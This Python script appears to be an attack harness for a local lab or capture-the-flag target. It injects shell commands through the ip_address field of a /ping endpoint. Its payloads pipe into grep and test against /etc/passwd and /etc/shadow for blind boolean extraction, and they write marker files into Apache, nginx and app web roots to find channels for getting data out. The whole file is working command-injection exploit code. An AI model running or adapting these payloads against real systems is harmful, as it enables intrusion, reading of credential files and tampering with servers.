import requests
import time

BASE_URL = "http://127.0.0.1:32943"
PING_ENDPOINT = f"{BASE_URL}/ping"

def send_ping(ip_address):
    """Send POST request to /ping with ip_address parameter"""
    try:
        response = requests.post(
            PING_ENDPOINT,
            data={"ip_address": ip_address},
            timeout=10
        )
        return response.status_code, response.text
    except Exception as e:
        return None, str(e)

print("="*80)
print("TEST 1: Pipe Exit Codes for Boolean Extraction")
print("="*80)

# Test grep success vs failure in pipe
test1_cases = [
    ("grep finds pattern (exit 0)", "127.0.0.1 | grep -q root /etc/passwd"),
    ("grep no match (exit 1)", "127.0.0.1 | grep -q NONEXISTENT_HOPEFULLY /etc/passwd"),
]

for desc, payload in test1_cases:
    print(f"\n[TEST] {desc}")
    print(f"Payload: {payload}")
    status, text = send_ping(payload)
    print(f"Status: {status}")
    print(f"Response: {text.strip()}")
    time.sleep(0.5)

print("\n" + "="*80)
print("TEST 2: Pipe Suppressing Ping Output")
print("="*80)

test2_cases = [
    ("cat consumes input", "127.0.0.1 | cat"),
    ("head -c 0 truncates", "127.0.0.1 | head -c 0"),
    ("true command", "127.0.0.1 | true"),
    ("false command", "127.0.0.1 | false"),
]

for desc, payload in test2_cases:
    print(f"\n[TEST] {desc}")
    print(f"Payload: {payload}")
    status, text = send_ping(payload)
    print(f"Status: {status}")
    print(f"Response: {text.strip()}")
    time.sleep(0.5)

print("\n" + "="*80)
print("TEST 3: File Write Side Channels")
print("="*80)

# Generate unique marker for this test
import random
marker = f"EXFIL_TEST_{random.randint(1000, 9999)}"
print(f"Using marker: {marker}")

# Test file write to common web paths
write_tests = [
    # Basic writes
    ("current directory", f"127.0.0.1 | echo '{marker}'>./test_output.txt"),
    ("/tmp directory", f"127.0.0.1 | echo '{marker}'>/tmp/test_output.txt"),
    # Apache paths
    ("/var/www/html", f"127.0.0.1 | echo '{marker}'>/var/www/html/test_output.txt"),
    # Nginx paths
    ("/usr/share/nginx/html", f"127.0.0.1 | echo '{marker}'>/usr/share/nginx/html/test_output.txt"),
    # Flask/Django paths
    ("/app/static", f"127.0.0.1 | echo '{marker}'>/app/static/test_output.txt"),
    ("/opt/app", f"127.0.0.1 | echo '{marker}'>/opt/app/test_output.txt"),
]

written_paths = []
for desc, payload in write_tests:
    print(f"\n[TEST] Writing to {desc}")
    print(f"Payload: {payload}")
    status, text = send_ping(payload)
    print(f"Status: {status}")
    print(f"Response: {text.strip()}")
    if "reachable" in text.lower():
        written_paths.append(desc)
    time.sleep(0.5)

print("\n" + "="*80)
print("TEST 4: Check if written files are accessible via GET")
print("="*80)

# Try to access the files we attempted to write
access_paths = [
    "/test_output.txt",
    "/static/test_output.txt",
]

for path in access_paths:
    url = f"{BASE_URL}{path}"
    print(f"\n[ACCESS TEST] {url}")
    try:
        response = requests.get(url, timeout=5)
        print(f"Status: {response.status_code}")
        print(f"Content: {response.text[:500] if response.text else 'Empty'}")
        if marker in response.text:
            print(f"[!] EXFILTRATION CHANNEL FOUND! File accessible at {path}")
    except Exception as e:
        print(f"Error: {e}")
    time.sleep(0.3)

print("\n" + "="*80)
print("TEST 5: Conditional File Read via Exit Codes")
print("="*80)

# Test if we can conditionally affect response based on file existence
test5_cases = [
    ("file exists /etc/passwd", "127.0.0.1 | test -f /etc/passwd"),
    ("file exists /etc/shadow (unlikely)", "127.0.0.1 | test -f /etc/shadow"),
    ("file not exists", "127.0.0.1 | test -f /nonexistent_file_xyz"),
    ("directory exists /etc", "127.0.0.1 | test -d /etc"),
    ("directory not exists", "127.0.0.1 | test -d /nonexistent_dir_xyz"),
    ("[ -f ] syntax", "127.0.0.1 | [ -f /etc/passwd ]"),
    ("[ ! -f ] syntax", "127.0.0.1 | [ ! -f /etc/passwd ]"),
]

for desc, payload in test5_cases:
    print(f"\n[TEST] {desc}")
    print(f"Payload: {payload}")
    status, text = send_ping(payload)
    print(f"Status: {status}")
    print(f"Response: {text.strip()}")
    time.sleep(0.5)

print("\n" + "="*80)
print("TEST 6: Alternative Boolean Extraction Methods")
print("="*80)

# Test other approaches for boolean extraction
test6_cases = [
    ("grep with exit code - match", "127.0.0.1 | grep root /etc/passwd"),
    ("grep with exit code - no match", "127.0.0.1 | grep NONEXISTENT /etc/passwd"),
    ("diff same files", "127.0.0.1 | diff /etc/passwd /etc/passwd"),
    ("diff different files", "127.0.0.1 | diff /etc/passwd /etc/hosts"),
]

for desc, payload in test6_cases:
    print(f"\n[TEST] {desc}")
    print(f"Payload: {payload}")
    status, text = send_ping(payload)
    print(f"Status: {status}")
    print(f"Response: {text.strip()}")
    time.sleep(0.5)

print("\n" + "="*80)
print("SUMMARY")
print("="*80)
print("Tests completed. Check above output to identify viable exfiltration channels.")

